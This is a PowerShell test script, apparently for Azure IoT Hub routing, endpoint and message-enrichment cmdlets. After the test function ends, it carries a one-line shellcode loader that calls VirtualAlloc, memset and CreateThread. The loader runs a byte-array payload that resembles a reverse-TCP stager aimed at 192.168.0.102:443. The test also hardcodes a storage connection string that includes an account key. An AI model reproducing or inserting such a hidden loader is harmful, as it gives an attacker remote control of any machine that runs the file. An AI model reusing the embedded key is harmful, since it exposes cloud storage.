



















function Test-AzureRmIotHubRoutingLifecycle
{
	
	
	$azureStorageResourceGroupName = 'pshardcodedrg1234'
	$azureStorageSubscriptionId = '91d12660-3dec-467a-be2a-213b5544ddc0'
	$ascConnectionString = 'DefaultEndpointsProtocol=https;AccountName=pshardcodedstorage1234;AccountKey=W1ujKNLtPmMtaNqZfOCUU5cnYMI8bQeF9ODce4riISyT2RSXiIxcwuwQhzCmIuwPWi82ParLfbq1bOF5ypUnPw==;EndpointSuffix=core.windows.net'
	$containerName1 = 'container1'
	$containerName2 = 'container2'
	

	$Location = Get-Location "Microsoft.Devices" "IotHubs" "WEST US 2"
	$IotHubName = getAssetName
	$ResourceGroupName = getAssetName
	$namespaceName = getAssetName 'eventHub'
	$eventHubName = getAssetName
	$authRuleName = getAssetName
	$endpointName = getAssetName
	$endpointName1 = getAssetName
	$endpointName2 = getAssetName
	$routeName = getAssetName
	$enrichmentName = getAssetName
	$enrichmentValue = getAssetName
	$enrichmentUpdatedValue = getAssetName
	$endpoints = @($endpointName1,$endpointName2)
	$Sku = "S1"
	$EndpointTypeEventHub = [Microsoft.Azure.Commands.Management.IotHub.Models.PSEndpointType] "EventHub"
	$EndpointTypeAzureStorage = [Microsoft.Azure.Commands.Management.IotHub.Models.PSEndpointType] "AzureStorageContainer"
	$RoutingSourceTwinChangeEvents = [Microsoft.Azure.Commands.Management.IotHub.Models.PSRoutingSource] "TwinChangeEvents"
	$RoutingSourceDeviceMessages = [Microsoft.Azure.Commands.Management.IotHub.Models.PSRoutingSource] "DeviceMessages"

	
	$resourceGroup = New-AzResourceGroup -Name $ResourceGroupName -Location $Location 

	
	$iothub = New-AzIotHub -Name $IotHubName -ResourceGroupName $ResourceGroupName -Location $Location -SkuName $Sku -Units 1 

	
    $eventHubNamespace = New-AzEventHubNamespace -ResourceGroup $ResourceGroupName -NamespaceName $namespaceName -Location $Location
	Wait-Seconds 15
	Assert-True {$eventHubNamespace.ProvisioningState -eq "Succeeded"}
	$regexMatches = $eventHubNamespace.Id | Select-String -Pattern '^/subscriptions/(.*)/resourceGroups/(.*)/providers/(.*)$'
	$eventHubSubscriptionId = $regexMatches.Matches.Groups[1].Value
	$eventHubResourceGroup = $regexMatches.Matches.Groups[2].Value

    
	$msgRetentionInDays = 3
	$partionCount = 2
    $eventHub = New-AzEventHub -ResourceGroup $ResourceGroupName -NamespaceName $namespaceName -EventHubName $eventHubName -MessageRetentionInDays $msgRetentionInDays -PartitionCount $partionCount

	
	$rights = "Listen","Send"
	$authRule = New-AzEventHubAuthorizationRule -ResourceGroup $ResourceGroupName -NamespaceName $namespaceName  -EventHubName $eventHubName -AuthorizationRuleName $authRuleName -Rights $rights
	$keys = Get-AzEventHubKey -ResourceGroup $ResourceGroupName -NamespaceName $namespaceName  -EventHubName $eventHubName -AuthorizationRuleName $authRuleName
	$ehConnectionString = $keys.PrimaryConnectionString

	
	$routingEndpoints = Get-AzIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $routingEndpoints.Count -eq 0}

	
	$newRoutingEndpoint = Add-AzIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName -EndpointType $EndpointTypeEventHub -EndpointResourceGroup $eventHubResourceGroup -EndpointSubscriptionId $eventHubSubscriptionId -ConnectionString $ehConnectionString
	Assert-True { $newRoutingEndpoint.ResourceGroup -eq $eventHubResourceGroup}
	Assert-True { $newRoutingEndpoint.SubscriptionId -eq $eventHubSubscriptionId}
	Assert-True { $newRoutingEndpoint.Name -eq $endpointName}

	
	$newRoutingEndpoint1 = Add-AzureRmIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName1 -EndpointType $EndpointTypeAzureStorage -EndpointResourceGroup $azureStorageResourceGroupName -EndpointSubscriptionId $azureStorageSubscriptionId -ConnectionString $ascConnectionString -ContainerName $containerName1 -Encoding json
	Assert-True { $newRoutingEndpoint1.Name -eq $endpointName1}
	Assert-True { $newRoutingEndpoint1.ResourceGroup -eq $azureStorageResourceGroupName}
	Assert-True { $newRoutingEndpoint1.SubscriptionId -eq $azureStorageSubscriptionId}
	Assert-True { $newRoutingEndpoint1.Encoding -eq "json"}

	
	$newRoutingEndpoint2 = Add-AzureRmIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName2 -EndpointType $EndpointTypeAzureStorage -EndpointResourceGroup $azureStorageResourceGroupName -EndpointSubscriptionId $azureStorageSubscriptionId -ConnectionString $ascConnectionString -ContainerName $containerName2
	Assert-True { $newRoutingEndpoint2.Name -eq $endpointName2}
	Assert-True { $newRoutingEndpoint2.ResourceGroup -eq $azureStorageResourceGroupName}
	Assert-True { $newRoutingEndpoint2.SubscriptionId -eq $azureStorageSubscriptionId}
	Assert-True { $newRoutingEndpoint2.Encoding -eq "avro"}

	
	$updatedRoutingEndpoints = Get-AzureRmIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $updatedRoutingEndpoints.Count -eq 3}
	Assert-True { $updatedRoutingEndpoints[0].Name -eq $endpointName}
	Assert-True { $updatedRoutingEndpoints[0].EndpointType -eq $EndpointTypeEventHub}
	Assert-True { $updatedRoutingEndpoints[1].Name -eq $endpointName1}
	Assert-True { $updatedRoutingEndpoints[1].EndpointType -eq $EndpointTypeAzureStorage}
	Assert-True { $updatedRoutingEndpoints[2].Name -eq $endpointName2}
	Assert-True { $updatedRoutingEndpoints[2].EndpointType -eq $EndpointTypeAzureStorage}

	
	$enrichments = Get-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $enrichments.Count -eq 0}

	
	$newEnrichment = Add-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName -Key $enrichmentName -Value $enrichmentValue -Endpoint $endpointName1
	Assert-True { $newEnrichment.Key -eq $enrichmentName}
	Assert-True { $newEnrichment.Value -eq $enrichmentValue}
	Assert-True { $newEnrichment.EndpointNames -eq $endpointName1}

	
	$enrichments = Get-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $enrichments.Count -eq 1}

	
	$enrichment = Get-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName -Key $enrichmentName
	Assert-True { $enrichment.Key -eq $enrichmentName}
	Assert-True { $enrichment.Value -eq $enrichmentValue}
	Assert-True { $enrichment.EndpointNames -eq $endpointName1}

	
	$updatedEnrichment = Set-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName -Key $enrichmentName -Value $enrichmentUpdatedValue
	Assert-True { $updatedEnrichment.Key -eq $enrichmentName}
	Assert-True { $updatedEnrichment.Value -eq $enrichmentUpdatedValue}
	Assert-True { $updatedEnrichment.EndpointNames -eq $endpointName1}

	
	$updatedEnrichment = Set-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName -Key $enrichmentName -Endpoint $endpointName1,$endpointName2
	Assert-True { $updatedEnrichment.Key -eq $enrichmentName}
	Assert-True { $updatedEnrichment.Value -eq $enrichmentUpdatedValue}
	Assert-True { $updatedEnrichment.EndpointNames.Count -eq 2}
	Assert-True { $updatedEnrichment.EndpointNames[0] -eq $endpointName1}
	Assert-True { $updatedEnrichment.EndpointNames[1] -eq $endpointName2}

	
	$result = Remove-AzIotHubMessageEnrichment -ResourceGroupName $ResourceGroupName -Name $IotHubName -Key $enrichmentName -Passthru
	Assert-True { $result }

	
	$result = Remove-AzureRmIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName1 -Passthru
	Assert-True { $result }
	$result = Remove-AzureRmIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName2 -Passthru
	Assert-True { $result }

	
	$updatedRoutingEndpoints = Get-AzIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $updatedRoutingEndpoints.Count -eq 1}
	Assert-True { $updatedRoutingEndpoints[0].ResourceGroup -eq $eventHubResourceGroup}
	Assert-True { $updatedRoutingEndpoints[0].SubscriptionId -eq $eventHubSubscriptionId}
	Assert-True { $updatedRoutingEndpoints[0].Name -eq $endpointName}

	
	$routes = Get-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $routes.Count -eq 0}

	
	$newRoute = Add-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName -RouteName $routeName -Source $RoutingSourceDeviceMessages -EndpointName $endpointName
	Assert-True { $newRoute.Name -eq $routeName}
	Assert-True { $newRoute.Source -eq $RoutingSourceDeviceMessages}
	Assert-True { $newRoute.EndpointNames -eq $endpointName}
	Assert-False { $newRoute.IsEnabled }

	
	$routes = Get-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName
	Assert-True { $routes.Count -eq 1}
	Assert-True { $routes[0].Name -eq $routeName}
	Assert-True { $routes[0].Source -eq $RoutingSourceDeviceMessages}
	Assert-True { $routes[0].EndpointNames -eq $endpointName}
	Assert-False { $routes[0].IsEnabled }

	
	$updatedRoute = Set-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName -RouteName $routeName -Source $RoutingSourceTwinChangeEvents -Enabled
	Assert-True { $updatedRoute.Name -eq $routeName}
	Assert-True { $updatedRoute.Source -eq $RoutingSourceTwinChangeEvents}
	Assert-True { $updatedRoute.EndpointNames -eq $endpointName}
	Assert-True { $updatedRoute.IsEnabled }

	
	$testRouteOutput = Test-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName -Source $RoutingSourceTwinChangeEvents
	Assert-True { $testRouteOutput.Count -eq 1}
	Assert-True { $testRouteOutput[0].Name -eq $routeName}
	Assert-True { $testRouteOutput[0].Source -eq $RoutingSourceTwinChangeEvents}
	Assert-True { $testRouteOutput[0].EndpointNames -eq $endpointName}
	Assert-True { $testRouteOutput[0].IsEnabled }

	
	$result = Remove-AzIotHubRoute -ResourceGroupName $ResourceGroupName -Name $IotHubName -RouteName $routeName -Passthru
	Assert-True { $result }

	
	$result = Remove-AzIotHubRoutingEndpoint -ResourceGroupName $ResourceGroupName -Name $IotHubName -EndpointName $endpointName -Passthru
	Assert-True { $result }

	
	Remove-AzIotHub -ResourceGroupName $ResourceGroupName -Name $IotHubName
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x66,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

